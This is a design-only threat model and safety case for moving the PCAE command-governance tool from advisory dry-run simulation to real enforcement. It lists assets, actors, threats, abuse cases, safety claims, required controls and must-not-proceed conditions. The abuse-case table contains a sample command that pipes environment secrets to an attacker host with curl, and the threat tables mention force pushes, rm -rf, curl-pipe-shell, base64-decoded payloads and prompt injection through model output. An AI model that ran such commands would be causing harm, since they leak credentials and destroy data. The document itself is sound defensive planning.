# Phase 89G — Enforcement Readiness Threat Model and Safety Case

```
phase_name    = phase_89g_enforcement_readiness_threat_model
phase_version = 1.0
phase_status  = completed
implementation_status = design_only
recommended_next_phase = 89h_enforcement_audit_and_rollback_model_design
```

## 1. Purpose

Create a threat model and safety case for future PCAE enforcement. Identify what could go wrong if PCAE moves from advisory/dry-run simulation into real blocking, command mediation, shell gate enforcement, backend execution gating, or persistent authorization. Define risks, abuse cases, failure modes, safety claims, required controls, evidence requirements, and must-not-proceed conditions before any enforcement prototype is allowed.

This is a **design/analysis document**. No implementation is performed in 89G.

## 2. Scope

In scope (analysis only):

- Assets PCAE must protect
- Actors with access to PCAE-governed systems
- Trust boundaries between components
- Threat categories and specific threats
- Abuse cases (intentional and accidental)
- Failure modes (system failures, edge cases)
- Safety claims with required controls
- Evidence requirements before enforcement
- Minimum test requirements before enforcement
- Audit, rollback, approval, accepted-risk, and secret-protection requirements
- Future Telegram/mobile-control risk considerations
- Must-not-proceed conditions
- Readiness assessment

Out of scope:

- Implementing any enforcement, blocking, or interception
- Implementing any of the controls defined here
- Changing source or test behavior
- Phase 89H task contract

## 3. Non-Goals

89G must not and does not implement enforcement, blocking, shell interception, wrappers, backend invocation, authorization, or any source/test changes.

## 4. Starting Point from 89F

89F concluded:
- **Ready:** Simulation-only operator use, CLI, JSON, UX, advisory/broker/shell-gate integration
- **Not Ready:** Real enforcement, shell interception, wrappers, backend gates, persistent authorization
- **16 guardrails** defined across design, test, and infrastructure categories
- **~200 minimum enforcement tests** estimated
- **8 deferred defects** documented

89G builds on this by defining the threat model and safety case that must be satisfied before any enforcement phase begins.

## 5. Assets

### 5.1 Primary Assets

| Asset | Value | Impact if Compromised |
|-------|-------|----------------------|
| Repository source code | Intellectual property, business logic | Unauthorized modification, data loss |
| Task contracts | Governance rules, allowed files/zones | Bypass of scope enforcement |
| Governance artifacts | Health, check, doctor, push state | False governance green-light |
| Git history | Audit trail, provenance | History rewritten, evidence lost |
| Working tree integrity | Current development state | Silent corruption |
| Secrets and environment variables | API keys, tokens, credentials | Secret leakage, credential theft |

### 5.2 Secondary Assets

| Asset | Value | Impact if Compromised |
|-------|-------|----------------------|
| Prompt/output artifacts | Backend interaction records | Injection, data exfiltration |
| Audit trail | Enforcement decision history | Missing evidence, non-repudiation loss |
| Approval decisions | Human review/approval records | Unauthorized action attribution |
| Rollback path | Recovery capability | Inability to undo enforcement |
| Local shell environment | Operator's working context | Shell hijacking, alias injection |
| Backend credentials | AI service access | Unauthorized backend usage, cost |
| Operator trust | Confidence in PCAE | Operator disables or bypasses PCAE |

## 6. Actors

### 6.1 Human Actors

| Actor | Intent | Access Level |
|-------|--------|-------------|
| **Task Developer** | Complete governed tasks; may accidentally run blocked commands | Full shell access |
| **Release Operator** | Push code; may be tempted to bypass governed push | Full shell access |
| **Malicious Insider** | Intentionally bypass governance, exfiltrate secrets | Full shell access |
| **New PCAE User** | Unfamiliar with governance; may misinterpret advisory output | Full shell access |

### 6.2 Automated Actors

| Actor | Intent | Access Level |
|-------|--------|-------------|
| **PCAE CLI** | Enforce governance rules | Runs as operator's user |
| **Shell (bash/zsh/sh)** | Execute commands | Full system access |
| **Git hooks** | Pre/post-commit validation | Repository access |
| **Claude/DeepSeek/Kimi agent** | Execute governed actions | Controlled by task contracts |
| **Backend runtimes** | Execute AI model calls | Network access, API credentials |
| **Future Telegram controller** | Remote operator commands | Network-accessible, mobile |

### 6.3 Adversarial Actors

| Actor | Threat |
|-------|--------|
| **Malicious prompt content** | Injection via adopted output |
| **Compromised backend response** | Malicious commands in model output |
| **Stale/corrupted task state** | Bypass via inconsistent governance state |
| **Accidental operator approval** | Human error approving dangerous action |

## 7. Trust Boundaries

### 7.1 Boundary Map

```
┌─────────────────────────────────────────────────────────┐
│  Operator's Shell Environment                            │
│  ┌──────────┐    ┌──────────┐    ┌──────────────────┐   │
│  │  Human   │───▶│  Shell   │───▶│  Direct Command  │   │
│  │ Operator │    │ (bash)   │    │  Execution       │   │
│  └──────────┘    └──────────┘    └──────────────────┘   │
│       │               │                                  │
│       ▼               ▼                                  │
│  ┌──────────────────────────────────────────────────┐   │
│  │              PCAE CLI Boundary                    │   │
│  │  ┌────────┐  ┌──────────┐  ┌──────────────────┐  │   │
│  │  │Dry-Run │  │ Advisory │  │ Governed Commit/ │  │   │
│  │  │  Sim   │  │  Check   │  │      Push        │  │   │
│  │  └────────┘  └──────────┘  └──────────────────┘  │   │
│  └──────────────────────────────────────────────────┘   │
│       │               │                                  │
│       ▼               ▼                                  │
│  ┌──────────────────────────────────────────────────┐   │
│  │           Repository Boundary                     │   │
│  │  Source │ Tasks │ Gov Artifacts │ Git History    │   │
│  └──────────────────────────────────────────────────┘   │
│                                                          │
│  ┌──────────────────────────────────────────────────┐   │
│  │           Backend Boundary (External)             │   │
│  │  Claude │ DeepSeek │ Kimi │ Future Backends      │   │
│  └──────────────────────────────────────────────────┘   │
│                                                          │
│  ┌──────────────────────────────────────────────────┐   │
│  │        Future Telegram/Mobile Boundary            │   │
│  │  Telegram Bot ←→ PCAE Command Router             │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

### 7.2 Trust Boundary Properties

| Boundary | Trust Level | Validation |
|----------|------------|------------|
| Human ↔ Shell | Untrusted | Commands classified by shell gate |
| Shell ↔ PCAE CLI | Untrusted | All commands evaluated before governed action |
| PCAE CLI ↔ Repository | Trusted (PCAE controls) | PCAE writes through governed paths only |
| PCAE CLI ↔ Backend | Untrusted | Backend output quarantined, reviewed |
| PCAE CLI ↔ Git hooks | Semi-trusted | Hooks run in repo context |
| Telegram ↔ PCAE | Untrusted (future) | Commands authenticated, classified, rate-limited |

## 8. Threat Categories

### 8.1 Command Execution Threats

| # | Threat | Severity | Current Mitigation |
|---|--------|----------|-------------------|
| T1 | Raw git push bypassing governed push | High | Advisory/dry-run flags it; not enforced |
| T2 | Force push bypassing permanent block | Critical | Advisory/dry-run flags it; not enforced |
| T3 | Out-of-scope file mutation | High | Scope preflight exists; not enforced |
| T4 | Destructive filesystem commands (rm -rf) | Critical | Classified as destructive; not enforced |
| T5 | Backend invocation without task contract | High | Classified as backend_invocation; not enforced |
| T6 | Policy-forbidden file mutation (README.md) | Medium | Classified; not enforced |
| T7 | Shell -c / eval / subshell command wrapping | High | 89A shell handling; embedded commands classified |
| T8 | Compact operator bypass (cmd1&&cmd2) | Medium | 89A compact operator splitting |
| T9 | Curl-pipe-shell execution | Critical | curl classified as network_access; pipe classified |
| T10 | sudo-prefixed commands | Medium | Not classified (deferred defect D3) |

### 8.2 Shell Interception Threats

| # | Threat | Severity | Current Mitigation |
|---|--------|----------|-------------------|
| T11 | Shell wrapper installation modifies shell behavior | High | Not implemented; boundary enforced |
| T12 | Shell configuration modification (.bashrc, .zshrc) | High | Not implemented; boundary enforced |
| T13 | Alias/function injection overriding PCAE commands | Medium | Not addressed |
| T14 | PROMPT_COMMAND / precmd hook injection | Medium | Not addressed |

### 8.3 Authorization and State Threats

| # | Threat | Severity | Current Mitigation |
|---|--------|----------|-------------------|
| T15 | Stale active task contract granting false scope | Medium | Task contract detection is real-time |
| T16 | Corrupted session state bypassing health checks | Medium | Session continuity verification exists |
| T17 | Accepted risk overriding hard blocks | Critical | Design invariant: cannot override (88V §16) |
| T18 | Human approval overriding hard blocks | Critical | Design invariant: cannot override (88V §16) |
| T19 | Accidental human approval for dangerous action | High | No multi-party or timeout mechanism |
| T20 | Authorization state persisted incorrectly | Medium | No persistent authorization state exists |

### 8.4 Secret and Redaction Threats

| # | Threat | Severity | Current Mitigation |
|---|--------|----------|-------------------|
| T21 | Secret leakage in command text output | Critical | 88V.1/89A redaction rules |
| T22 | Secret leakage in JSON fields | Critical | All fields redacted before serialization |
| T23 | Secret leakage in audit logs | Critical | Audit logging not implemented |
| T24 | env/printenv secret exposure | High | Classified as secret_access (88V.1) |
| T25 | Shell variable expansion leaking secrets ($VAR) | Medium | Not detected (deferred defect D1) |

### 8.5 Audit and Recovery Threats

| # | Threat | Severity | Current Mitigation |
|---|--------|----------|-------------------|
| T26 | Missing audit record for enforcement action | High | Audit not implemented |
| T27 | Audit log tampering | High | Audit not implemented |
| T28 | Inability to rollback enforcement | High | Rollback not designed |
| T29 | Rollback leaves system in inconsistent state | Medium | Rollback not designed |
| T30 | Enforcement state persists after disable | Medium | No persistent enforcement state |

### 8.6 Future Interface Threats

| # | Threat | Severity | Current Mitigation |
|---|--------|----------|-------------------|
| T31 | Telegram command injection | High | Not implemented; needs authentication |
| T32 | Unauthorized Telegram operator | Critical | Not implemented; needs identity verification |
| T33 | Telegram message replay attack | Medium | Not implemented; needs nonce/timestamp |
| T34 | Mobile command latency causing timeout issues | Low | Not implemented |

## 9. Abuse Cases

### 9.1 Intentional Abuse

| # | Abuse Case | Method | Required Control |
|---|-----------|--------|-----------------|
| A1 | Force push to rewrite history | `git push --force` directly in shell | Enforcement must block or detect |
| A2 | Exfiltrate secrets via env | `env \| curl -X POST attacker.com -d @-` | Secret access → block + redact |
| A3 | Bypass classification with encoding | Base64-encoded malicious command piped to sh | Command parser must detect decode-exec patterns |
| A4 | Bypass via shell scripts | Write malicious script, execute with bash | Script execution gated by task contract |
| A5 | Bypass via git hooks | Malicious pre-push hook bypassing pcae push | Hook content subject to governance |
| A6 | Backend prompt injection | Crafted task output that tricks operator into running dangerous command | Output quarantine + review before adoption |

### 9.2 Accidental Abuse

| # | Abuse Case | Method | Required Control |
|---|-----------|--------|-----------------|
| A7 | Operator copies blocked command from advisory output | Advisory says "you may run directly" — operator runs dangerous command | Clearer "do not execute" for hard blocks |
| A8 | Operator approves review without reading | Click-through human review approval | Review requires explicit action, not just flag |
| A9 | Operator accepts risk without understanding | "I accept risk" without reading what risk | Risk description must be explicit and specific |

## 10. Failure Modes

### 10.1 Classification Failures

| # | Failure Mode | Impact | Detection |
|---|-------------|--------|-----------|
| F1 | False allow: dangerous command classified as safe | Operator runs dangerous command believing it's safe | Test matrix, threat model tests |
| F2 | False block: safe command classified as dangerous | Operator bypasses PCAE, loses trust | False positive reporting workflow |
| F3 | Unknown classification on dangerous command | Command not flagged, operator proceeds | Conservative: unknown → blocked |
| F4 | Parser confusion on obfuscated command | Classification bypassed | Adversarial command tests |

### 10.2 Enforcement Failures

| # | Failure Mode | Impact | Detection |
|---|-------------|--------|-----------|
| F5 | Enforcement fails open (block not applied) | Dangerous command executes | Safety invariant: fail closed |
| F6 | Enforcement fails closed (all commands blocked) | Operator cannot work | Emergency disable mechanism |
| F7 | Enforcement state corruption | Inconsistent blocking behavior | State integrity checks |
| F8 | Race condition: check passes, state changes, command executes | Command runs under stale evidence | Atomic check-and-enforce |

### 10.3 Audit Failures

| # | Failure Mode | Impact | Detection |
|---|-------------|--------|-----------|
| F9 | Audit log write failure | Missing enforcement record | Audit write verification |
| F10 | Audit log filled (disk full) | No more audit records | Log rotation, disk space monitoring |
| F11 | Audit log contains raw secrets | Secret leakage | Redaction before audit write |

## 11. Safety Claims

### 11.1 Claim Definitions

| # | Safety Claim | Rationale |
|---|-------------|-----------|
| **SC-1** | PCAE must not execute unapproved commands | Core invariant: PCAE is read-only governance, not an executor |
| **SC-2** | PCAE must not allow hard blocks to be overridden | 88V §16: accepted risk and human approval cannot override hard blocks |
| **SC-3** | PCAE must not confuse advisory/dry-run output with real authorization | 88Z principle: every output states non-authorization |
| **SC-4** | PCAE must preserve audit evidence for enforcement decisions | Non-repudiation: every enforcement action must be traceable |
| **SC-5** | PCAE must preserve rollback ability before mutation | Recovery: operator can always undo governed mutations |
| **SC-6** | PCAE must protect secrets in all output paths | 88V.1/89A: redaction in command text, JSON, audit logs |
| **SC-7** | PCAE must fail closed when evidence is missing | Conservative: unknown/missing evidence → block, not allow |
| **SC-8** | PCAE must detect or prevent known bypass paths | 89F §14: 7 classes of bypass documented |
| **SC-9** | PCAE must keep operator-visible wording unambiguous | 88Z §7: anti-principles prohibit "permission granted" language |
| **SC-10** | PCAE must not move to enforcement without explicit authorization | 89F must-not-proceed: requires design doc, task contract, tests |

### 11.2 Claim Verification

| Claim | Verification Method | Current Status |
|-------|-------------------|----------------|
| SC-1 | 244 tests confirm command_executed=false | ✅ Verified |
| SC-2 | Hard-block tests confirm non-overridable | ✅ Verified |
| SC-3 | Human-readable output states non-authorization | ✅ Verified (89E) |
| SC-4 | Audit not implemented | ❌ Not verified |
| SC-5 | Rollback not designed | ❌ Not verified |
| SC-6 | 244 tests confirm redaction | ✅ Verified |
| SC-7 | Unknown → blocked_by_unknown_command in _decide | ✅ Verified |
| SC-8 | Known bypass paths documented, not all detected | ⚠️ Partially |
| SC-9 | 89E UX refinement confirms unambiguous wording | ✅ Verified |
| SC-10 | Not enforced by code | ⚠️ Process control |

## 12. Required Controls

### 12.1 Design Controls

| # | Control | Maps to Claim | Priority |
|---|---------|--------------|----------|
| C1 | Explicit enforcement-mode flag (per-repo or per-session) | SC-10 | Critical |
| C2 | Separate enforcement task contract with explicit scope | SC-10 | Critical |
| C3 | JSON schema versioning policy | SC-3, SC-4 | High |
| C4 | CLI compatibility policy | SC-3 | High |
| C5 | Operator approval model (who, how, expiry) | SC-2 | Critical |
| C6 | Accepted-risk policy (what risks, who accepts, audit) | SC-2 | Critical |
| C7 | Secret-redaction policy (what, when, how audited) | SC-6 | Critical |
| C8 | Dry-run-to-enforcement migration checklist | SC-10 | High |

### 12.2 Implementation Controls

| # | Control | Maps to Claim | Priority |
|---|---------|--------------|----------|
| C9 | Command parser threat-model tests | SC-8 | Critical |
| C10 | Hard-block invariant tests (prove non-overridable) | SC-2 | Critical |
| C11 | Safety invariant tests (all performed flags false) | SC-1, SC-3 | Critical |
| C12 | Bypass detection mechanism | SC-8 | High |
| C13 | Emergency disable mechanism | SC-5 | Critical |
| C14 | Atomic check-and-enforce for race conditions | SC-7 | High |
| C15 | Cross-platform shell tests (bash, zsh, sh) | SC-8 | High |

### 12.3 Infrastructure Controls

| # | Control | Maps to Claim | Priority |
|---|---------|--------------|----------|
| C16 | Immutable audit log (`.pcae/enforcement/`) | SC-4 | Critical |
| C17 | Rollback artifact creation before mutation | SC-5 | Critical |
| C18 | Audit log redaction (no raw secrets) | SC-6 | Critical |
| C19 | Audit log integrity verification | SC-4 | High |
| C20 | Enforcement state isolation (separate from advisory/simulation) | SC-3 | High |

## 13. Evidence Required Before Enforcement

### 13.1 Design Evidence

| # | Evidence | Status |
|---|---------|--------|
| E1 | Enforcement design document (separate phase) | ❌ |
| E2 | Enforcement task contract | ❌ |
| E3 | Audit model design | ❌ |
| E4 | Rollback model design | ❌ |
| E5 | Operator approval model design | ❌ |
| E6 | Accepted-risk policy design | ❌ |
| E7 | JSON schema versioning policy | ❌ |
| E8 | CLI compatibility policy | ❌ |
| E9 | Dry-run-to-enforcement migration checklist | ❌ |

### 13.2 Test Evidence

| # | Evidence | Status |
|---|---------|--------|
| E10 | Command parser threat-model tests passing | ❌ |
| E11 | Hard-block invariant tests passing | ✅ (89D) |
| E12 | Safety invariant tests passing | ✅ (89D) |
| E13 | Full suite green (zero failures) | ✅ (9,311) |
| E14 | Cross-platform shell tests passing | ❌ |
| E15 | Bypass detection tests passing | ❌ |
| E16 | Emergency disable tests passing | ❌ |
| E17 | Audit integrity tests passing | ❌ |
| E18 | Rollback tests passing | ❌ |

### 13.3 Operational Evidence

| # | Evidence | Status |
|---|---------|--------|
| E19 | Operator documentation for enforcement | ❌ |
| E20 | Enforcement disable procedure documented | ❌ |
| E21 | Recovery procedure documented | ❌ |
| E22 | Enforcement changelog entry | ❌ |

## 14. Required Tests Before Enforcement

### 14.1 Minimum Test Suite (~200 tests)

| Category | Minimum | Description |
|----------|---------|-------------|
| Enforcement decision equivalence | 50 | Enforcement decisions match simulation |
| Block enforcement verification | 30 | Blocked commands actually blocked |
| Allow enforcement verification | 20 | Allowed commands actually allowed |
| Bypass detection | 15 | Direct shell execution detected |
| Emergency disable | 10 | Disable works, restores normal shell |
| Audit trail integrity | 15 | Correct audit records |
| Rollback verification | 10 | Rollback from enforcement to simulation |
| Cross-platform | 20 | bash, zsh, sh |
| Performance | 10 | Acceptable overhead |
| Threat model adversarial | 20 | Obfuscation, encoding, injection |

### 14.2 Existing Tests That Apply

244 simulation + 24 CLI tests from 89D provide coverage for decision correctness, invariants, hard blocks, redaction, and CLI behavior. These validate the decision-making path but not the blocking-enforcement path.

## 15. Audit Requirements

### 15.1 Audit Event Schema

Every enforcement action must produce an audit event:

| Field | Description |
|-------|-------------|
| `event_id` | Unique event identifier |
| `timestamp` | ISO 8601 timestamp |
| `operator` | Operator identifier (user, agent) |
| `command_text` | Redacted command text |
| `command_hash` | SHA-256 of original command (for integrity, not stored raw) |
| `decision` | Broker decision |
| `simulation_decision` | Simulation would-* decision |
| `enforcement_action` | blocked / allowed / gated_review / denied |
| `outcome` | enforced / bypassed / errored |
| `repository_state` | Git commit hash at time of enforcement |
| `task_contract` | Active task contract ID (if any) |
| `evidence_sources` | What evidence was consulted |

### 15.2 Audit Integrity

- Audit log stored in `.pcae/enforcement/audit.jsonl`
- Each line is a signed/checksummed JSON record
- Audit log is append-only (no deletion, no modification)
- Audit log is gitignored (not committed to repository)
- Audit log rotation: max 10MB per file, max 100 files

## 16. Rollback Requirements

### 16.1 Rollback Capabilities

| Capability | Description |
|-----------|-------------|
| `pcae enforcement disable` | Disable enforcement, restore normal shell |
| `pcae enforcement status` | Show current enforcement state |
| Rollback preserves audit history | Disabling does not delete audit logs |
| Rollback is immediate | No delay, no restart required |
| Rollback is reversible | Operator can re-enable enforcement |

### 16.2 Rollback Safety

- Rollback must not leave shell in inconsistent state
- Rollback must not require internet connectivity
- Rollback must work even if PCAE state is corrupted
- Rollback must be documented and tested

## 17. Operator Approval Model Requirements

### 17.1 Approval Properties

| Property | Requirement |
|----------|------------|
| Explicit | Approval requires deliberate action, not just a flag |
| Specific | Approval names the specific command/action being approved |
| Time-bound | Approval expires after configurable duration (default: 1 hour) |
| Auditable | Every approval recorded in audit log |
| Non-overridable for hard blocks | Approval cannot override hard blocks |
| Revocable | Operator can revoke their own approval |

### 17.2 Multi-Party Approval (Future)

For high-risk actions (force push override, backend invocation, adoption):
- Require approval from two different operators
- Approval chain recorded in audit log
- Deferred to enforcement Stage 4+

## 18. Accepted-Risk Policy Requirements

### 18.1 Policy Properties

| Property | Requirement |
|----------|------------|
| Explicit risk description | Operator must see what specific risk they're accepting |
| Non-overridable for hard blocks | Accepted risk cannot override hard blocks (88V §16) |
| Auditable | Every risk acceptance recorded |
| Time-bound | Risk acceptance expires |
| Revocable | Risk acceptance can be withdrawn |
| Scoped | Risk acceptance applies to specific command/action, not global |

### 18.2 Risk Levels

| Level | Description | Required Approval |
|-------|-------------|------------------|
| Low | Read-only command with uncertain classification | Self-approval |
| Medium | Filesystem write in task scope | Self-approval + task contract |
| High | Backend invocation, network access | Human review + approval |
| Critical | Hard blocks | Cannot be accepted — permanent block |

## 19. Secret-Protection Requirements

### 19.1 Protection Scope

| Area | Requirement |
|------|------------|
| Command text | Redact before display, JSON serialization, audit logging |
| Environment variables | Detect secret-like names, redact values |
| Secret files | Detect access to ~/.ssh, ~/.aws, etc. |
| Backend credentials | Never stored in PCAE state |
| Audit logs | Never contain raw secret text |
| Error messages | Never echo raw command text containing secrets |

### 19.2 Redaction Verification

- Every output path tested for redaction (244 existing tests)
- New enforcement audit path must have equivalent redaction tests
- Redaction must be applied before any persistent storage write

## 20. Future Telegram/Mobile-Control Considerations

### 20.1 Risk Assessment

Telegram/mobile control introduces additional threat vectors:

| Risk | Severity | Mitigation |
|------|----------|------------|
| Command injection via Telegram message | Critical | Command validation identical to CLI path |
| Unauthorized Telegram user | Critical | User ID whitelist, authentication token |
| Message replay attack | Medium | Nonce/timestamp per command |
| Man-in-the-middle (Telegram server) | Medium | End-to-end encryption consideration |
| Latency causing timeout in enforcement checks | Low | Adjust timeouts for mobile latency |
| Mobile keyboard auto-correct changing commands | Low | Command confirmation step |

### 20.2 Required Controls for Mobile

| Control | Priority |
|---------|----------|
| Operator authentication (Telegram user ID whitelist) | Critical |
| Command confirmation (reply with "confirm" to execute) | Critical |
| Rate limiting (max N commands per minute) | High |
| Command text redaction (same as CLI) | Critical |
| Audit logging with operator identification | High |
| Mobile-specific timeout handling | Medium |

### 20.3 Mobile Readiness

Mobile control is **not ready** for enforcement. It requires:
- Separate design phase for mobile command routing
- Authentication and authorization model
- Mobile-specific threat model
- Mobile-specific test suite

**Recommendation:** Mobile control should remain advisory/simulation-only until the above are designed and implemented.

## 21. Must-Not-Proceed Conditions

### 21.1 Absolute Blocks

Enforcement implementation must not proceed if ANY of these conditions are unmet:

| # | Condition | Rationale |
|---|-----------|-----------|
| **MNP-1** | No enforcement design document | Design is the authority; implementation without design is ungoverned |
| **MNP-2** | No enforcement task contract | Task contract defines scope, allowed files, forbidden zones |
| **MNP-3** | No audit model implemented | Enforcement without audit is unaccountable |
| **MNP-4** | No rollback model implemented | Enforcement without rollback is irreversible |
| **MNP-5** | No safety invariant tests passing | Without tests, invariants are claims not facts |
| **MNP-6** | No command parser threat-model tests | Without adversarial tests, parser is unvalidated |
| **MNP-7** | No explicit operator approval model | Without approval model, authority is undefined |
| **MNP-8** | No bypass detection | Without detection, enforcement is circumventable |
| **MNP-9** | No emergency disable mechanism | Without disable, enforcement failure blocks all work |
| **MNP-10** | Full suite not green | Enforcement must not regress existing behavior |

### 21.2 Conditional Blocks

| # | Condition | Rationale |
|---|-----------|-----------|
| **MNP-11** | JSON schema versioning policy not defined | Breaking changes without policy break machine consumers |
| **MNP-12** | Cross-platform shell tests not passing | Enforcement must work on all supported shells |
| **MNP-13** | Operator documentation not written | Operator must understand enforcement before it applies |
| **MNP-14** | Recovery procedure not documented | Operator must know how to recover from enforcement failure |

## 22. Readiness Assessment

### 22.1 Overall Assessment

**PCAE is NOT ready for enforcement implementation.**

| Dimension | Status | Gap |
|-----------|--------|-----|
| Simulation/decision correctness | ✅ Ready | 9,311 tests, zero failures |
| Classification coverage | ✅ Ready | 89A fixed known FPs/FNs |
| Safety invariants | ✅ Ready | 12 invariants, all verified |
| UX clarity | ✅ Ready | 89E structured output |
| **Enforcement design** | ❌ | Does not exist |
| **Audit model** | ❌ | Not designed |
| **Rollback model** | ❌ | Not designed |
| **Operator approval model** | ❌ | Not designed |
| **Bypass detection** | ❌ | Not designed |
| **Threat model tests** | ❌ | Not implemented |
| **Cross-platform tests** | ❌ | Not implemented |
| **Emergency disable** | ❌ | Not designed |

### 22.2 Minimum Phases Before Enforcement

| Phase | Name | Type |
|-------|------|------|
| 89H | Audit and Rollback Model Design | Design |
| 89I | Operator Approval and Accepted-Risk Model Design | Design |
| 89J | Enforcement Prototype (Stage 3 Dry-Run Blocking) | Implementation |
| 89K | Enforcement Test Matrix and Bypass Detection | Tests |
| 89L | Cross-Platform and Threat Model Tests | Tests |
| 89M+ | Enforcement Stages 4–6 | Implementation |

## 23. Recommended Next Phase

**89H — Enforcement Readiness Audit and Rollback Model Design**

Design the audit trail and rollback infrastructure that enforcement requires:
- Audit event schema and storage design
- Audit integrity and redaction guarantees
- Rollback artifact creation (pre-mutation snapshots)
- `pcae enforcement disable` command design
- Enforcement state machine (enabled/disabled/degraded)
- Audit log rotation and retention policy

This is the logical next step: before enforcement can block commands, PCAE must be able to record what it blocked, prove the record is intact, and provide a way to disable blocking safely.
